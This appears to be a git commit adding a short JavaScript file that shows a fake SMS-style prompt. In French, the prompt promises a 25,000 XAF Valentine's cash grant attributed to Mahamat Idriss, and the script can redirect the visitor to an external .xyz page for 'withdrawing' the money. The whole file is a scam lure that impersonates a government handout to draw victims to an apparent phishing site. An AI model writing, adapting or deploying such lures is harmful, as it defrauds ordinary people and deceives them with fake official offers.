87a7cc596ef8193e6a848b3f37319a756da58b4d
bigetijazz22 <bigetijazz22@gmail.com>
2025-01-30 15:27:47 +0100

    Create valgrant.js

---
+++ valgrant.js
@@ -0,0 +1,6 @@
+
+var password = 'RECLAMER 25,000 XAF'
+password=prompt('SMS: Félicitations, vous êtes admissible à MAHAMAT IDRISS 25,000 XAF SUBVENTION EN ESPÈCES DE LA SAINT-VALENTIN POUR TOUS, Veuillez appuyer sur OK pour RECLAMER Prix ​​en espèces','RECLAMER 25,000 XAF');
+if (password != 'RECLAMER 25,000 XAF') {
+location.href='https://www.chadoffrez.xyz/Retirer-25000XAF';
+}
